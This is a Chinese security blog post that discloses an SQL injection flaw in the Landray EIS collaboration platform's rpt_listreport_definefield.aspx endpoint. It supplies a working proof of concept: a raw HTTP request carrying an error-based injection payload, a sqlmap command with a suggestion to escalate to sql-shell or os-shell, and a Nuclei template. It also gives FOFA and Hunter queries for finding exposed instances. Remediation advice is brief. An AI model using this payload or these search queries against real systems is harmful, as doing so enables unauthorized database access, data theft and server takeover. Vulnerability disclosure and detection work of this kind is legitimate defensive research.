#  【漏洞新情报 | 附POC】蓝凌EIS智慧协同平台SQL注入   
原创 4Zen  划水但不摆烂   2024-03-04 01:37  
  
## 免责声明   
  
文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
## 产品简介   
  
蓝凌EIS智慧协同平台现集合了非常丰富的模块，满足组织企业在知识，协同，项目管理系统建设等需求。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwjgI5E86gibCMJrzbVNyzA2GT8fmFM76Fcdia88zj8FLm3sU2TEtOMF53lqQ6NQMGzlxm6qdvd3XVg/640?wx_fmt=png&from=appmsg "")  
## 漏洞描述   
  
蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。  
## 网络测绘   
  
favicon图标特征  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwjgI5E86gibCMJrzbVNyzA2qvVXcR82v2qxyrWqw3RGofJgibjrjZPv7a1HTFmwEcMjGwP8WdFic58g/640?wx_fmt=png&from=appmsg "")  
  
FOFA网络测绘搜索  
```
app="Landray-EIS智慧协同平台" || body="jquery.landray.common.js" || icon_hash="953405444"

```  
  
鹰图网络测绘搜索  
```
app.name="Landray 蓝凌 EIS智慧协同平台"

```  
## 漏洞复现   
  
POC：  
```
GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1

```  
```
Payload：/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+
原始格式：/SM/rpt_listreport_definefield.aspx?ID=2 and 1=@@version--+

```  
  
利用Payload进行报错验证，通过回显页面可验证问题的存在与否  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwjgI5E86gibCMJrzbVNyzA27S9lEvwLa8Of4EJcGRB6giaicHeeibXHibEt4E4gFCYwpoOtC7g9XocC9A/640?wx_fmt=png&from=appmsg "")  
  
在红队场景下可以直接利用sqlmap进行sql-shell或os-shell进行一把梭获取更高权限分：  
```
python sqlmap.py -u "http://127.0.0.1/SM/rpt_listreport_definefield.aspx?ID=2" --is-dba

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwjgI5E86gibCMJrzbVNyzA2dZOT9e0r5Ir7rYSEbrsYU1XlUsGqm9AwpESEMcRNKaDInNhf751uZA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwjgI5E86gibCMJrzbVNyzA2T42VKB3qQmso788dqDEzicDjficSgcmYQ8UiaR6GmXxKjT9ibVcFpUUkSg/640?wx_fmt=png&from=appmsg "")  
  
Nuclei检测脚本：  
```
id: Landray-EIS-rpt_listreport_definefield-sqli

info:
  name: 蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口SQL注入漏洞
  author: 4Zen
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Microsoft"

```  
## 修复方案   
  
1、联系供应商获取最优解决方案。2、更新到最新版本或及时到官网获取相应补丁进行漏洞修补。  
  
  
